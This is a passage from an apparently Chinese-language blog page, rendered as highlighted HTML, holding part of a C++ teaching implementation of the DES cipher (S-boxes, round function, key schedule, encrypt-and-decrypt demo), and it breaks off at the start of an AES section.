class="hljs-number">5</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">13</span> },<br>            { <span class="hljs-number">15</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">7</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">3</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">9</span> },<br>{ <span class="hljs-number">10</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">4</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">8</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">12</span> },<br>            { <span class="hljs-number">7</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">2</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">7</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">14</span> },<br>            { <span class="hljs-number">2</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">2</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">13</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">3</span> },<br>            { <span class="hljs-number">12</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">14</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">8</span>, <span class="hljs-number">13</span> },<br>            { <span class="hljs-number">4</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">1</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">7</span>, <span class="hljs-number">14</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">5</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">12</span> },<br>            { <span class="hljs-number">13</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">11</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span> }<br>    };<br><br>    <span class="hljs-comment">// P盒置换</span><br>    <span class="hljs-type">int</span> per[<span class="hljs-number">32</span>]<br>            = { <span class="hljs-number">16</span>, <span class="hljs-number">7</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">29</span>, <span class="hljs-number">12</span>, <span class="hljs-number">28</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">23</span>,<br>                <span class="hljs-number">26</span>, <span class="hljs-number">5</span>, <span class="hljs-number">18</span>, <span class="hljs-number">31</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">24</span>, <span class="hljs-number">14</span>, <span class="hljs-number">32</span>, <span class="hljs-number">27</span>,<br>                <span class="hljs-number">3</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">19</span>, <span class="hljs-number">13</span>, <span class="hljs-number">30</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">22</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">25</span> };<br><br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {<br>        string right_expanded = <span class="hljs-built_in">permute</span>(right, exp_d, <span class="hljs-number">48</span>);<br><br>        string x = <span class="hljs-built_in">xor_</span>(rkb[i], right_expanded);<br><br>        <span class="hljs-comment">// S</span><br>        string op = <span class="hljs-string">""</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) {<br>            <span class="hljs-type">int</span> row = <span class="hljs-number">2</span> * <span class="hljs-built_in">int</span>(x[i * <span class="hljs-number">6</span>] - <span class="hljs-string">'0'</span>)<br>                      + <span class="hljs-built_in">int</span>(x[i * <span class="hljs-number">6</span> + <span class="hljs-number">5</span>] - <span class="hljs-string">'0'</span>);<br>            <span class="hljs-type">int</span> col = <span class="hljs-number">8</span> * <span class="hljs-built_in">int</span>(x[i * <span class="hljs-number">6</span> + <span class="hljs-number">1</span>] - <span class="hljs-string">'0'</span>)<br>                      + <span class="hljs-number">4</span> * <span class="hljs-built_in">int</span>(x[i * <span class="hljs-number">6</span> + <span class="hljs-number">2</span>] - <span class="hljs-string">'0'</span>)<br>                      + <span class="hljs-number">2</span> * <span class="hljs-built_in">int</span>(x[i * <span class="hljs-number">6</span> + <span class="hljs-number">3</span>] - <span class="hljs-string">'0'</span>)<br>                      + <span class="hljs-built_in">int</span>(x[i * <span class="hljs-number">6</span> + <span class="hljs-number">4</span>] - <span class="hljs-string">'0'</span>);<br>            <span class="hljs-type">int</span> val = s[i][row][col];<br>            op += <span class="hljs-built_in">char</span>(val / <span class="hljs-number">8</span> + <span class="hljs-string">'0'</span>);<br>            val = val % <span class="hljs-number">8</span>;<br>            op += <span class="hljs-built_in">char</span>(val / <span class="hljs-number">4</span> + <span class="hljs-string">'0'</span>);<br>            val = val % <span class="hljs-number">4</span>;<br>            op += <span class="hljs-built_in">char</span>(val / <span class="hljs-number">2</span> + <span class="hljs-string">'0'</span>);<br>            val = val % <span class="hljs-number">2</span>;<br>            op += <span class="hljs-built_in">char</span>(val + <span class="hljs-string">'0'</span>);<br>        }<br>        op = <span class="hljs-built_in">permute</span>(op, per, <span class="hljs-number">32</span>);<br><br>        x = <span class="hljs-built_in">xor_</span>(op, left);<br><br>        left = x;<br><br>        <span class="hljs-comment">// 交换左右</span><br>        <span class="hljs-keyword">if</span> (i != <span class="hljs-number">15</span>) {<br>            <span class="hljs-built_in">swap</span>(left, right);<br>        }<br>        cout &lt;&lt; <span class="hljs-string">"轮数: "</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">" "</span> &lt;&lt; <span class="hljs-built_in">bin2hex</span>(left)<br>             &lt;&lt; <span class="hljs-string">" "</span> &lt;&lt; <span class="hljs-built_in">bin2hex</span>(right) &lt;&lt; <span class="hljs-string">" "</span> &lt;&lt; rk[i]<br>             &lt;&lt; endl;<br>    }<br><br>    <span class="hljs-comment">// 左右结合</span><br>    string combine = left + right;<br><br>    <span class="hljs-comment">// IP逆置换</span><br>    <span class="hljs-type">int</span> final_perm[<span class="hljs-number">64</span>]<br>            = { <span class="hljs-number">40</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">48</span>, <span class="hljs-number">16</span>, <span class="hljs-number">56</span>, <span class="hljs-number">24</span>, <span class="hljs-number">64</span>, <span class="hljs-number">32</span>, <span class="hljs-number">39</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">47</span>,<br>                <span class="hljs-number">15</span>, <span class="hljs-number">55</span>, <span class="hljs-number">23</span>, <span class="hljs-number">63</span>, <span class="hljs-number">31</span>, <span class="hljs-number">38</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">46</span>, <span class="hljs-number">14</span>, <span class="hljs-number">54</span>, <span class="hljs-number">22</span>,<br>                <span class="hljs-number">62</span>, <span class="hljs-number">30</span>, <span class="hljs-number">37</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">45</span>, <span class="hljs-number">13</span>, <span class="hljs-number">53</span>, <span class="hljs-number">21</span>, <span class="hljs-number">61</span>, <span class="hljs-number">29</span>, <span class="hljs-number">36</span>,<br>                <span class="hljs-number">4</span>,  <span class="hljs-number">44</span>, <span class="hljs-number">12</span>, <span class="hljs-number">52</span>, <span class="hljs-number">20</span>, <span class="hljs-number">60</span>, <span class="hljs-number">28</span>, <span class="hljs-number">35</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">43</span>, <span class="hljs-number">11</span>,<br>                <span class="hljs-number">51</span>, <span class="hljs-number">19</span>, <span class="hljs-number">59</span>, <span class="hljs-number">27</span>, <span class="hljs-number">34</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">42</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>,<br>                <span class="hljs-number">26</span>, <span class="hljs-number">33</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">41</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">49</span>, <span class="hljs-number">17</span>, <span class="hljs-number">57</span>, <span class="hljs-number">25</span> };<br><br>    string cipher = <span class="hljs-built_in">bin2hex</span>(<span class="hljs-built_in">permute</span>(combine, final_perm, <span class="hljs-number">64</span>));<br>    <span class="hljs-keyword">return</span> cipher;<br>}<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    string pt, key;<br>    cout&lt;&lt;<span class="hljs-string">"请输入明文: "</span>;<br>    cin&gt;&gt;pt;<br>    cout&lt;&lt;<span class="hljs-string">"请输入密文: "</span>;<br>    cin&gt;&gt;key;<br>    pt = <span class="hljs-built_in">string_to_hex</span>(pt);<br>    cout&lt;&lt;pt;<br>    key = <span class="hljs-built_in">string_to_hex</span>(key);<br>    key = <span class="hljs-built_in">hex2bin</span>(key);<br>    <span class="hljs-type">int</span> keyp[<span class="hljs-number">56</span>]<br>            = { <span class="hljs-number">57</span>, <span class="hljs-number">49</span>, <span class="hljs-number">41</span>, <span class="hljs-number">33</span>, <span class="hljs-number">25</span>, <span class="hljs-number">17</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">58</span>, <span class="hljs-number">50</span>, <span class="hljs-number">42</span>, <span class="hljs-number">34</span>,<br>                <span class="hljs-number">26</span>, <span class="hljs-number">18</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">51</span>, <span class="hljs-number">43</span>, <span class="hljs-number">35</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>,<br>                <span class="hljs-number">60</span>, <span class="hljs-number">52</span>, <span class="hljs-number">44</span>, <span class="hljs-number">36</span>, <span class="hljs-number">63</span>, <span class="hljs-number">55</span>, <span class="hljs-number">47</span>, <span class="hljs-number">39</span>, <span class="hljs-number">31</span>, <span class="hljs-number">23</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>,<br>                <span class="hljs-number">62</span>, <span class="hljs-number">54</span>, <span class="hljs-number">46</span>, <span class="hljs-number">38</span>, <span class="hljs-number">30</span>, <span class="hljs-number">22</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">61</span>, <span class="hljs-number">53</span>, <span class="hljs-number">45</span>, <span class="hljs-number">37</span>,<br>                <span class="hljs-number">29</span>, <span class="hljs-number">21</span>, <span class="hljs-number">13</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">28</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> };<br><br>    <span class="hljs-comment">//密钥生成</span><br>    key = <span class="hljs-built_in">permute</span>(key, keyp, <span class="hljs-number">56</span>);<br><br>    <span class="hljs-type">int</span> shift_table[<span class="hljs-number">16</span>] = { <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>,<br>                            <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span> };<br><br>    <span class="hljs-type">int</span> key_comp[<span class="hljs-number">48</span>] = { <span class="hljs-number">14</span>, <span class="hljs-number">17</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">28</span>,<br>                         <span class="hljs-number">15</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">21</span>, <span class="hljs-number">10</span>, <span class="hljs-number">23</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>,<br>                         <span class="hljs-number">26</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">16</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">27</span>, <span class="hljs-number">20</span>, <span class="hljs-number">13</span>, <span class="hljs-number">2</span>,<br>                         <span class="hljs-number">41</span>, <span class="hljs-number">52</span>, <span class="hljs-number">31</span>, <span class="hljs-number">37</span>, <span class="hljs-number">47</span>, <span class="hljs-number">55</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>,<br>                         <span class="hljs-number">51</span>, <span class="hljs-number">45</span>, <span class="hljs-number">33</span>, <span class="hljs-number">48</span>, <span class="hljs-number">44</span>, <span class="hljs-number">49</span>, <span class="hljs-number">39</span>, <span class="hljs-number">56</span>,<br>                         <span class="hljs-number">34</span>, <span class="hljs-number">53</span>, <span class="hljs-number">46</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">36</span>, <span class="hljs-number">29</span>, <span class="hljs-number">32</span> };<br>    string left = key.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-number">28</span>);<br>    string right = key.<span class="hljs-built_in">substr</span>(<span class="hljs-number">28</span>, <span class="hljs-number">28</span>);<br><br>    vector&lt;string&gt; rkb;<br>    vector&lt;string&gt; rk;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {<br>        left = <span class="hljs-built_in">shift_left</span>(left, shift_table[i]);<br>        right = <span class="hljs-built_in">shift_left</span>(right, shift_table[i]);<br><br>        string combine = left + right;<br><br>        string RoundKey = <span class="hljs-built_in">permute</span>(combine, key_comp, <span class="hljs-number">48</span>);<br><br>        rkb.<span class="hljs-built_in">push_back</span>(RoundKey);<br>        rk.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">bin2hex</span>(RoundKey));<br>    }<br><br>    cout &lt;&lt; <span class="hljs-string">"加密:\n"</span>;<br>    string cipher = <span class="hljs-built_in">encrypt</span>(pt, rkb, rk);<br>    cout &lt;&lt; <span class="hljs-string">"密文: "</span> &lt;&lt; cipher &lt;&lt; endl;<br><br>    cout &lt;&lt; <span class="hljs-string">"解密:\n"</span>;<br>    <span class="hljs-built_in">reverse</span>(rkb.<span class="hljs-built_in">begin</span>(), rkb.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-built_in">reverse</span>(rk.<span class="hljs-built_in">begin</span>(), rk.<span class="hljs-built_in">end</span>());<br>    string text = <span class="hljs-built_in">encrypt</span>(cipher, rkb, rk);<br>    text = <span class="hljs-built_in">hex_to_string</span>(text);<br>    cout &lt;&lt; <span class="hljs-string">"明文: "</span> &lt;&lt; text &lt;&lt; endl;<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span 